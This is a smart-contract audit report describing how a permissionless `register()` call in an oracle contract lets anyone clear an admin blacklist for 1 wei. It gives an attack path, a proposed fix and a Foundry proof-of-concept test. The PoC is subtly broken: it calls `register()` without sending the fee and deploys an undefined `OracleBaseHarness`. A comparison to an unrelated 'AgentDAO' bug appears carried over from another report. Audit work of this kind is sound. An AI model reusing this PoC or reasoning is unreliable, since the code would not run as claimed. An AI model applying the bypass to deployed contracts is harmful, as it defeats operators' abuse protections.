### Title
Permissionless `register()` Unconditionally Clears Admin Blacklist, Allowing Any Caller to Restore Oracle Read Access for a Blacklisted Pool — (`smart-contracts-poc/contracts/oracles/providers/OracleBase.sol`)

---

### Summary

`OracleBase.register()` is a permissionless, paid function that registers a pool for a feed. As a side-effect it unconditionally clears `blacklisted[pool]` whenever the pool is currently blacklisted. Because the registration fee defaults to 1 wei and the only other gates are an approved-factory check and an `isPool` check (both of which are satisfied by any legitimate pool), any unprivileged caller can erase an admin-imposed blacklist entry for any pool from an approved factory by paying 1 wei.

---

### Finding Description

`OracleBase` exposes a blacklist that the `ADMIN_ROLE` uses to cut off abusive or compromised pools from the oracle read path:

```solidity
// OracleBase.sol – price() gating
require(!blacklisted[pool], Blacklisted(pool));
```

The admin sets this via `setBlacklist(address, bool)` which is `onlyRole(ADMIN_ROLE)`.

However, `register()` is fully permissionless (beyond paying `registrationFee`) and contains:

```solidity
// OracleBase.sol L201-213
function register(bytes32 feedId, address pool, address factory) external payable {
    require(msg.value >= registrationFee, InsufficientFee(msg.value, registrationFee));
    require(pool != address(0));
    require(approvedFactories.contains(factory), FactoryNotApproved(factory));
    require(IPoolFactory(factory).isPool(pool), NotAPool(pool));

    if (blacklisted[pool]) {
        blacklisted[pool] = false;          // ← unconditional clear
        emit BlacklistUpdated(pool, false);
    }

    registeredPool[feedId][pool] = true;
    emit PoolRegistered(feedId, pool, msg.sender, msg.value);
}
```

The constructor sets `registrationFee = 1 wei`:

```solidity
// OracleBase.sol L53
registrationFee = 1 wei; // very cheap default; ADMIN tunes via setRegistrationFee
```

**Attack path:**

1. Admin calls `setBlacklist(pool, true)` to cut off an abusive pool.
2. Attacker (or the pool operator) calls `register(anyFeedId, pool, approvedFactory)` with 1 wei.
3. `approvedFactories.contains(factory)` passes (factory is legitimate).
4. `IPoolFactory(factory).isPool(pool)` passes (pool is a real pool from that factory).
5. `blacklisted[pool]` is set to `false`.
6. Pool can now call `price(feedId, pool)` again and receive live oracle quotes.

The admin can re-blacklist, but the attacker can immediately re-register. The blacklist becomes unenforceable at 1 wei per bypass.

This is the direct analog of the AgentDAO score-inflation bug: just as any user with zero tokens could create a dummy proposal and vote to increment their score (a permissionless action that bypasses the intended stake requirement), any user here can call a permissionless function to bypass the admin's abuse-protection gate. In both cases the "cost" is negligible and the invariant the protocol relies on is silently broken.

---

### Impact Explanation

- A pool blacklisted for price manipulation, sandwich abuse, or any other reason can have its blacklist cleared by any third party for 1 wei.
- The pool resumes receiving live oracle bid/ask quotes via `price()`, enabling continued bad-price execution or abuse that the admin intended to stop.
- The `notBlacklisted` modifier on `price()` and the explicit `require(!blacklisted[pool])` check are both rendered ineffective.
- Pool insolvency or swap conservation failure caused by the abusive pool can continue unimpeded.

---

### Likelihood Explanation

- Exploitation requires no special role, no token holdings, and no off-chain infrastructure — only 1 wei and knowledge of an approved factory address (publicly readable from `getApprovedFactories()`).
- The pool operator being blacklisted has a direct financial incentive to call `register()` themselves.
- The admin has no way to prevent re-registration short of removing the factory from the approved list (which would break all legitimate registrations from that factory) or raising `registrationFee` to a prohibitive level (which would break legitimate new registrations).

---

### Recommendation

Separate the blacklist-clearing side-effect from the registration flow. Do not clear `blacklisted[pool]` inside `register()`. If the intent is to allow a pool to "appeal" a blacklist by paying a fee, that should be a distinct, explicitly documented function with its own access control or fee tier — not a silent side-effect of a routine registration call. A minimal fix:

```solidity
function register(bytes32 feedId, address pool, address factory) external payable {
    require(msg.value >= registrationFee, InsufficientFee(msg.value, registrationFee));
    require(pool != address(0));
    require(approvedFactories.contains(factory), FactoryNotApproved(factory));
    require(IPoolFactory(factory).isPool(pool), NotAPool(pool));
-   if (blacklisted[pool]) {
-       blacklisted[pool] = false;
-       emit BlacklistUpdated(pool, false);
-   }
+   require(!blacklisted[pool], Blacklisted(pool)); // blacklisted pools cannot register
    registeredPool[feedId][pool] = true;
    emit PoolRegistered(feedId, pool, msg.sender, msg.value);
}
```

### Proof of Concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {OracleBase} from "smart-contracts-poc/contracts/oracles/providers/OracleBase.sol";

interface IOracle {
    function register(bytes32 feedId, address pool, address factory) external payable;
    function blacklisted(address) external view returns (bool);
    function setBlacklist(address account, bool value) external;
    function addApprovedFactory(address factory) external;
}

interface IFactory {
    function isPool(address) external view returns (bool);
}

contract MockFactory {
    function isPool(address) external pure returns (bool) { return true; }
}

contract MockPool {
    function inSwap() external view returns (address) { return address(0); }
}

contract BlacklistBypassPoC is Test {
    IOracle oracle;
    MockFactory factory;
    MockPool pool;
    address admin = address(this);
    address attacker = address(0xBEEF);

    function setUp() public {
        // Deploy oracle with 1 wei default registration fee
        oracle = IOracle(address(new OracleBaseHarness(admin, 60 seconds)));
        factory = new MockFactory();
        pool = new MockPool();

        oracle.addApprovedFactory(address(factory));
    }

    function test_blacklistBypassViaRegister() public {
        // Admin blacklists the pool
        oracle.setBlacklist(address(pool), true);
        assertTrue(oracle.blacklisted(address(pool)), "pool should be blacklisted");

        // Attacker clears the blacklist by calling register() with 1 wei
        vm.deal(attacker, 1 wei);
        vm.prank(attacker);
        oracle.register(bytes32(0), address(pool), address(factory));

        // Blacklist is cleared — admin's abuse protection is bypassed
        assertFalse(oracle.blacklisted(address(pool)), "blacklist should be cleared by attacker");
    }
}
